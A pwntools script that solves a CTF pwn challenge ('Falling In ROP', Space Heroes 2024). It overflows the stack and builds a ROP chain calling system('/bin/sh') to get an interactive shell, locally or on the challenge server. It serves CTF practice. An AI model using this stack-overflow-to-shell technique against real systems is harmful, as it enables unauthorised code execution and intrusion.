#!/usr/bin/env python3
import sys, os
from pwn import *

context.update(
    arch="amd64",
    endian="little",
    os="linux",
    log_level="debug",
    terminal=["tmux", "split-window", "-h", "-p 65"],
)

REMOTE = False
TARGET = os.path.realpath("/ctf-archive/Space Heroes 2024/pwn/Falling In ROP/falling.bin")
elf = ELF(TARGET)

def attach(r):
    if not REMOTE:
        bkps = ['*vuln+91']
        cmds = []

        gdb.attach(r, '\n'.join(["break {}".format(x) for x in bkps] + cmds))
    return

def exploit(r):
    attach(r)

    pop_rdi = 0x4011cd
    ret = 0x401016

    payload = cyclic(0x58)
    payload += p64(ret)
    payload += p64(pop_rdi)
    payload += p64(next(elf.search('/bin/sh')))
    payload += p64(elf.plt['system'])

    r.sendlineafter(b'Tell me who you are: ', payload)
    r.interactive()
    return

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("spaceheroes-falling-in-rop.chals.io", 443, ssl=True, sni="spaceheroes-falling-in-rop.chals.io")
    else:
        REMOTE = False
        r = process([TARGET,])

    exploit(r)
    exit(0)
